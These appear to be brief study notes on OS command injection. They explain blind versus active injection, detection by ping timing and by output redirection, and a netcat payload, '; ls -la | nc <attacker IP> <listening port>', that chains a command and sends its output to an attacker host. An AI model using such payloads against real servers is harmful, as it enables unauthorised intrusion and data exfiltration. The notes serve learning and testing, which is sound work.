Injection
-----------

Blind Command injection: This is where system call made to the server doesn't return any response to the HTML DOM. The DOM is where HTML is rendered on the browser side.

Ways to detect blind command injection
----------------------------------------

	- ping 
	Ping command is usually the best and easiest way to identify command injection vulnerability. If the php parameter you entered, is passed into a system call, then you can run ping -c 10, to send 10 ping requests to any host and note that the page will stop loading after 10 seconds, i.e. when the command is completed.

	- Redirection of output
	Other simple way is to redirect the output of a command to a file and then view that file by opening it in browser. Any command like whoami, id.
	- Also, you might notice that this is not possible sometimes because that directory or file might not be there to view or have restricted access. So this is not a preferred method. 

Bypassing Blind OS Injection:

	You can pipe out the output of one command to netcat... by the following command.

		; ls -la | nc <attacker IP> <listening port> 

	- Semicolon ends the previous command... and then another command is executed... The output is piped out to the attacker's netcat listening port.

Active Command Injection:

- Unlike Blind Command Injection, active command injectioin responds the output of executed command on the DOM.
- It's very easy to find... Usually, in a first attempt.
